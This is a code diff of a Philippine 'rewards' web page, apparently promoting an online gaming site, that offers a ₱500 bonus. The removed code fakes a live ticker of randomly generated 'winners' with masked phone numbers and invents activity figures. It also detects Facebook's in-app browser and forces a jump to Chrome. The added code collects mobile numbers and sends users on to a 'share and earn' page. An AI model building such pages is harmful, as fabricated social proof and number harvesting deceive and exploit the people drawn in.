-                // Close area
-                areaD += ' L ' + (padding + ((hourlyData.length - 1) * stepX)) + ' ' + (svgHeight - padding);
-                areaD += ' Z';
-                
-                // Set paths
-                linePath.setAttribute('d', lineD);
-                linePath.style.strokeDasharray = '2000';
-                linePath.style.strokeDashoffset = '2000';
-                linePath.style.transition = 'none';
-                
-                void linePath.offsetWidth;
-                
-                linePath.style.transition = 'stroke-dashoffset 1.5s ease-out';
-                linePath.style.strokeDashoffset = '0';
-                
-                // Area fade
-                areaPath.style.opacity = '0';
-                areaPath.setAttribute('d', areaD);
-                areaPath.style.transition = 'none';
-                void areaPath.offsetWidth;
-                areaPath.style.transition = 'opacity 1.5s ease-out';
-                areaPath.style.opacity = '0.5';
-                
-                // ✅ TRANSPARENT PT_icon ENDPOINT (Fade lights only)
-                var endpointHtml = '';
-                
-                // Use foreignObject for transparent PNG
-                endpointHtml += '<foreignObject x="' + (endpointX - 14) + '" y="' + (endpointY - 14) + '" width="28" height="28" class="graph-endpoint-icon">';
-                endpointHtml += '<div xmlns="http://www.w3.org/1999/xhtml" style="';
-                endpointHtml += 'width: 100%; height: 100%;';
-                endpointHtml += 'background: transparent;';
-                endpointHtml += 'display: flex; align-items: center; justify-content: center;';
-                endpointHtml += '">';
-                endpointHtml += '<img src="images/PT_icon.png" class="endpoint-img" alt="Now" />';
-                endpointHtml += '</div>';
-                endpointHtml += '</foreignObject>';
-                
-                pointsGroup.innerHTML = endpointHtml;
-            }
-            
-            // ========== HOURLY ACTIVITY ==========
-            function getHourlyActivity(hour) {
-                var basePattern = [
-                    2, 1, 1, 2, 3, 5, 8, 12, 15, 18, 20, 22,
-                    25, 28, 30, 32, 35, 40, 45, 48, 42, 35, 25, 15
-                ];
-                
-                var base = basePattern[hour] || 10;
-                var random = Math.floor(Math.random() * 8) - 4;
-                return Math.max(1, base + random);
-            }
-            
-            // ========== FORMAT HOUR ==========
-            function formatHour(hour) {
-                if (hour === 0) return '12AM';
-                if (hour < 12) return hour + 'AM';
-                if (hour === 12) return '12PM';
-                return (hour - 12) + 'PM';
-            }
-            
-            // ========== LOAD TOTAL CLAIMS (×500) ==========
-            function loadTotalClaims() {
-                if (!db) return;
-                
-                var today = new Date();
-                var year = today.getFullYear();
-                var month = String(today.getMonth() + 1).padStart(2, '0');
-                var day = String(today.getDate()).padStart(2, '0');
-                var dateKey = year + '-' + month + '-' + day;
-                
-                db.ref('festival_stats/daily/' + dateKey + '/claims_count').once('value').then(function(snap) {
-                    var count = snap.val() || 0;
-                    var totalAmount = count * 500;
-                    
-                    animateNumber('totalClaimsCount', count);
-                    
-                    var amountEl = document.getElementById('totalClaimsAmount');
-                    if (amountEl) {
-                        amountEl.textContent = formatAmount(totalAmount);
+                    // Format: XXX XXX XXXX
+                    var formatted = value;
+                    if (value.length > 6) {
+                        formatted = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6);
+                    } else if (value.length > 3) {
+                        formatted = value.substring(0, 3) + ' ' + value.substring(3);
                     }
                     
-                    console.log('📊 Claims:', count, '× ₱500 = ₱' + totalAmount);
-                }).catch(function(e) {
-                    console.error('Load claims error:', e);
+                    this.value = formatted;
+                    
+                    // Clear error
+                    if (errorMsg) errorMsg.style.display = 'none';
+                });
+
+                // Enter key
+                mobileInput.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        handleSubmit();
+                    }
                 });
             }
-            
-            // ========== FORMAT AMOUNT ==========
-            function formatAmount(amount) {
-                if (amount >= 1000000) {
-                    return '₱' + (amount / 1000000).toFixed(1) + 'M';
-                }
-                if (amount >= 1000) {
-                    return '₱' + (amount / 1000).toFixed(1) + 'K';
-                }
-                return '₱' + amount.toLocaleString();
-            }
-            
-            // ========== ANIMATE NUMBER ==========
-            function animateNumber(elementId, targetValue) {
-                var el = document.getElementById(elementId);
-                if (!el) return;
-                
-                var currentValue = parseInt(el.textContent) || 0;
-                if (currentValue === targetValue) return;
-                
-                var duration = 800;
-                var steps = 25;
-                var increment = (targetValue - currentValue) / steps;
-                var step = 0;
-                
-                var interval = setInterval(function() {
-                    step++;
-                    var val = Math.round(currentValue + (increment * step));
-                    el.textContent = val;
-                    
-                    if (step >= steps) {
-                        clearInterval(interval);
-                        el.textContent = targetValue;
-                    }
-                }, duration / steps);
-            }
-            
-            // ========== WINNER TICKER ==========
-            function startWinnerTicker() {
-                var winnerEntry = document.getElementById('winnerEntry');
-                if (!winnerEntry) return;
-                
-                var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
-                var amounts = [500, 500, 500, 1000, 500, 500, 500, 2000, 500, 500];
-                var actions = ["received", "received", "received", "withdraw", "received", "received"];
-                
-                function generateWinner() {
-                    var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-                    var last4 = Math.floor(1000 + Math.random() * 9000);
-                    var amount = amounts[Math.floor(Math.random() * amounts.length)];
-                    var action = actions[Math.floor(Math.random() * actions.length)];
-                    return { 
-                        prefix: prefix, 
-                        last4: last4, 
-                        amount: amount,
-                        action: action
-                    };
-                }
-                
-                function updateTicker() {
-                    var winner = generateWinner();
-                    var phoneNumber = winner.prefix + '***' + winner.last4;
-                    
-                    var text = '<i class="fas fa-bolt"></i> ' + 
-                               phoneNumber + ' ' + 
-                               winner.action + ' ' +
-                               '<span class="ticker-amount">+₱' + winner.amount.toLocaleString() + '</span>';
-                    
-                    winnerEntry.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
-                    winnerEntry.style.opacity = '0';
-                    winnerEntry.style.transform = 'translateY(-5px)';
-                    
-                    setTimeout(function() {
-                        winnerEntry.innerHTML = text;
-                        winnerEntry.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
-                        winnerEntry.style.opacity = '1';
-                        winnerEntry.style.transform = 'translateY(0)';
-                    }, 300);
-                }
-                
-                var initialWinner = generateWinner();
-                winnerEntry.innerHTML = '<i class="fas fa-bolt"></i> ' + 
-                    initialWinner.prefix + '***' + initialWinner.last4 + ' ' +
-                    initialWinner.action + ' ' +
-                    '<span class="ticker-amount">+₱' + initialWinner.amount.toLocaleString() + '</span>';
-                
-                tickerInterval = setInterval(updateTicker, 4800);
-            }
-            
-            // ========== RESET TIMER ==========
-            function startResetTimer() {
-                updateResetTimer();
-                resetTimerInterval = setInterval(updateResetTimer, 1000);
-            }
-            
-            function updateResetTimer() {
-                var now = new Date();
-                var midnight = new Date();
-                midnight.setHours(24, 0, 0, 0);
-                
-                var diff = midnight - now;
-                
-                var hours = Math.floor(diff / (1000 * 60 * 60));
-                var minutes = Math.floor((diff / (1000 * 60)) % 60);
-                var seconds = Math.floor((diff / 1000) % 60);
-                
-                var timerEl = document.getElementById('resetTimer');
-                if (timerEl) {
-                    timerEl.textContent = 
-                        String(hours).padStart(2, '0') + ':' +
-                        String(minutes).padStart(2, '0') + ':' +
-                        String(seconds).padStart(2, '0');
-                }
-            }
-            
-            // ========== START ==========
-            if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', init);
-            } else {
-                init();
-            }
-            
-        })();
-    </script>
-    
-    <script>
-        // ========== AUTO-REDIRECT IF ALREADY LOGGED IN ==========
-        (function() {
-            var existingUserPhone = localStorage.getItem("userPhone");
-            var existingDeviceId = localStorage.getItem("userDeviceId");
-            
-            if (existingUserPhone && 
-                existingUserPhone !== 'null' && 
-                existingUserPhone !== 'undefined' && 
-                existingUserPhone.length > 5) {
-                console.log('Existing user detected:', existingUserPhone);
-                console.log('Redirecting to PlayBonus.html...');
-                window.location.href = "PlayBonus.html";
-            }
-        })();
 
-        // ========== INTENT URL HANDLER ==========
-        (function() {
-            var isFacebookApp = navigator.userAgent.includes('FBAN') || 
-                                navigator.userAgent.includes('FBAV') ||
-                                navigator.userAgent.includes('Messenger');
-            
-            if (isFacebookApp && !window.location.hash.includes('redirected')) {
-                window.location.hash = 'redirected';
-                
-                var targetUrl = 'https://xjiligames.github.io/rewards/index.html';
-                var urlWithoutProtocol = targetUrl.replace('https://', '');
-                var intentUrl = 'intent://' + urlWithoutProtocol + '#Intent;scheme=https;package=com.android.chrome;end';
-                
-                window.location.href = intentUrl;
+            // ========== SUBMIT BUTTON ==========
+            if (submitBtn) {
+                submitBtn.addEventListener('click', handleSubmit);
             }
+
+            function handleSubmit() {
+                var rawValue = (mobileInput ? mobileInput.value : '').replace(/\D/g, '');
+                
+                // Validate
+                if (!rawValue || rawValue.length < 10) {
+                    showError('Please enter a valid 10-digit mobile number');
+                    return;
+                }
+                
+                // Format as 09XXXXXXXXX
+                var fullPhone = '0' + rawValue; // 9XXXXXXXXX -> 09XXXXXXXXX
+                
+                // Validate starts with 9
+                if (rawValue.charAt(0) !== '9') {
+                    showError('Mobile number must start with 9');
+                    return;
+                }
+
+                // Disable button
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>PROCESSING...</span>';
+
+                // Save to localStorage
+                localStorage.setItem('userPhone', fullPhone);
+
+                // Show loading modal
+                showLoadingModal();
+
+                // Redirect after delay
+                setTimeout(function() {
+                    window.location.href = 'share_and_earn.html';
+                }, 2000);
+            }
+
+            function showError(message) {
+                if (errorText) errorText.textContent = message;
+                if (errorMsg) {
+                    errorMsg.style.display = 'flex';
+                    errorMsg.style.animation = 'none';
+                    setTimeout(function() {
+                        errorMsg.style.animation = 'shake 0.5s ease';
+                    }, 10);
+                }
+            }
+
+            function showLoadingModal() {
+                if (!modalOverlay || !modalCard) return;
+                
+                modalCard.innerHTML = 
+                    '<div class="modal-icon">' +
+                        '<i class="fas fa-gift"></i>' +
+                    '</div>' +
+                    '<h2 class="modal-title">WELCOME!</h2>' +
+                    '<p class="modal-subtitle">Preparing your <strong class="gold-text">₱500 bonus</strong>...</p>' +
+                    '<div class="modal-loading">' +
+                        '<div class="loading-dots">' +
+                            '<span></span><span></span><span></span>' +
+                        '</div>' +
+                    '</div>';
+                
+                modalOverlay.style.display = 'flex';
+            }
+
+            // ========== CLOSE MODAL ON OVERLAY CLICK ==========
+            if (modalOverlay) {
+                modalOverlay.addEventListener('click', function(e) {
+                    if (e.target === modalOverlay) {
+                        modalOverlay.style.display = 'none';
+                    }
+                });
+            }
+
+            // ========== LOAD TREND DATA (optional) ==========
+            function loadTrendData() {
+                if (typeof firebase === 'undefined' || !firebase.database) return;
+                
+                try {
+                    var db = firebase.database();
+                    
+                    // Today's claims
+                    var now = new Date();
+                    var dateKey = now.getFullYear() + '-' + 
+                        String(now.getMonth() + 1).padStart(2, '0') + '-' + 
+                        String(now.getDate()).padStart(2, '0');
+                    
+                    db.ref('festival_stats/daily/' + dateKey).once('value').then(function(snap) {
+                        var data = snap.val() || {};
+                        
+                        var todayEl = document.getElementById('todayClaims');
+                        var totalEl = document.getElementById('totalClaimed');
+                        
+                        if (todayEl) todayEl.textContent = data.claims_count || 0;
+                        if (totalEl) totalEl.textContent = '₱' + ((data.claims_amount || 0).toLocaleString());
+                    }).catch(function() {});
+                } catch(e) {}
+            }
+
+            // Load trend data on page ready
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', loadTrendData);
+            } else {
+                loadTrendData();
+            }
+
         })();
     </script>
+
 </body>
 </html>
